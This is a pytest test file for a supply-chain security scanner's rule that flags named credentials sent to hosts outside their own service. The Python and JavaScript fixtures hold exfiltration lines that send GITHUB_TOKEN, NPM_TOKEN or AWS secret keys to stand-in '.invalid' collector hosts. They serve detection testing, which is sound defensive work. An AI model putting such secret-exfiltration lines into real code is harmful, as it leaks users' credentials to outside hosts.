"""L1: one named credential sent to a host outside its service, outside any install hook.

The snippets are inert: they name reserved `.invalid` hosts (RFC 2606), which resolve nowhere, and
are only ever parsed, never run.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.config import Config
from cordon_scanner.detect.secretflow import JavaScriptFlow, SecretFlow

RULE = "SUSPECT.EXFIL.NAMED_SECRET.001"


class FlowHelpers:
    @staticmethod
    def fired(tmp_path: Path, name: str, body: str) -> bool:
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(body, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return any(f.rule_id == RULE for f in result.findings)


class TestHomes:
    @pytest.mark.parametrize(
        ("name", "host", "expected"),
        [
            ("GITHUB_TOKEN", "api.github.com", False),
            ("GITHUB_TOKEN", "github.mycorp.example", False),
            ("GITHUB_TOKEN", "metrics.example.invalid", True),
            ("NPM_TOKEN", "registry.npmjs.org", False),
            ("NPM_TOKEN", "npm.internal.example", False),
            ("NPM_TOKEN", "artifactory.corp.example", False),
            ("NPM_TOKEN", "collector.example.invalid", True),
            ("AWS_SECRET_ACCESS_KEY", "collector.example.invalid", True),
            ("AWS_SECRET_ACCESS_KEY", "app.terraform.io", False),
            ("AWS_SECRET_ACCESS_KEY", "localhost", False),
            ("MY_SERVICE_API_KEY", "anywhere.example.invalid", False),
            ("GITHUB_TOKEN", None, False),
        ],
    )
    def test_misdirected(self, name, host, expected) -> None:
        assert SecretFlow.misdirected(name, host) is expected


class TestPython:
    def test_a_secret_concatenated_into_a_url(self, tmp_path) -> None:
        body = (
            "import os, urllib.request\n"
            'urllib.request.urlopen("https://c.example.invalid/v1?k=" + os.environ.get("AWS_SECRET_ACCESS_KEY"))\n'
        )
        assert FlowHelpers.fired(tmp_path, "goodlib/_telemetry.py", body)

    def test_through_variables(self, tmp_path) -> None:
        body = (
            "import os, requests\n"
            'TOKEN = os.getenv("NPM_TOKEN")\n'
            'URL = "https://m.example.invalid/c"\n'
            'requests.post(URL, data={"t": TOKEN})\n'
        )
        assert FlowHelpers.fired(tmp_path, "pkg/__init__.py", body)

    def test_an_api_client_calling_its_own_service(self, tmp_path) -> None:
        body = (
            "import os, requests\n"
            'tok = os.environ["GITHUB_TOKEN"]\n'
            'requests.get("https://api.github.com/user", headers={"Authorization": "token " + tok})\n'
        )
        assert not FlowHelpers.fired(tmp_path, "client.py", body)

    def test_a_configured_destination_is_not_judged(self, tmp_path) -> None:
        body = (
            "import os, requests\n"
            'requests.post(os.environ["VAULT_ADDR"], json={"k": os.environ["AWS_SECRET_ACCESS_KEY"]})\n'
        )
        assert not FlowHelpers.fired(tmp_path, "register.py", body)

    def test_a_generic_key_is_not_judged(self, tmp_path) -> None:
        body = (
            "import os, requests\n"
            'requests.get("https://api.weather.example.invalid/v1?key=" + os.environ["WEATHER_API_KEY"])\n'
        )
        assert not FlowHelpers.fired(tmp_path, "weather.py", body)

    def test_test_code_is_exempt(self, tmp_path) -> None:
        body = (
            "import os, urllib.request\n"
            'urllib.request.urlopen("https://c.example.invalid/?k=" + os.environ["GITHUB_TOKEN"])\n'
        )
        assert not FlowHelpers.fired(tmp_path, "tests/test_upload.py", body)


class TestJavaScript:
    def test_a_bound_token_in_a_fetch(self, tmp_path) -> None:
        body = (
            'const t = process.env.GITHUB_TOKEN;\nfetch("https://cdn.example.invalid/p?x=" + t);\n'
        )
        assert FlowHelpers.fired(tmp_path, "index.js", body)

    def test_a_destructured_token_in_a_template(self, tmp_path) -> None:
        body = (
            "const { NPM_TOKEN } = process.env;\n"
            'const https = require("https");\n'
            "https.get(`https://x.example.invalid/${NPM_TOKEN}`);\n"
        )
        assert FlowHelpers.fired(tmp_path, "lib/index.js", body)

    def test_a_url_bound_to_a_name(self, tmp_path) -> None:
        body = (
            'const endpoint = "https://h.example.invalid/collect";\n'
            "axios.post(endpoint, { t: process.env.AWS_SESSION_TOKEN });\n"
        )
        assert FlowHelpers.fired(tmp_path, "src/telemetry.ts", body)

    def test_the_registry_with_its_own_token(self, tmp_path) -> None:
        body = (
            "const t = process.env.NPM_TOKEN;\n"
            'fetch("https://registry.npmjs.org/-/whoami", {headers: {authorization: `Bearer ${t}`}});\n'
        )
        assert not FlowHelpers.fired(tmp_path, "publish.js", body)

    def test_no_literal_host_no_claim(self, tmp_path) -> None:
        body = "fetch(process.env.API_URL, {headers: {t: process.env.GITHUB_TOKEN}});\n"
        assert not FlowHelpers.fired(tmp_path, "client.js", body)

    def test_the_flow_reports_offset_name_and_host(self) -> None:
        text = (
            'const t = process.env.GITHUB_TOKEN;\nfetch("https://cdn.example.invalid/p?x=" + t);\n'
        )
        [(offset, name, host)] = JavaScriptFlow.findings(text)
        assert text[offset:].startswith("fetch") and name == "GITHUB_TOKEN"
        assert host == "cdn.example.invalid"
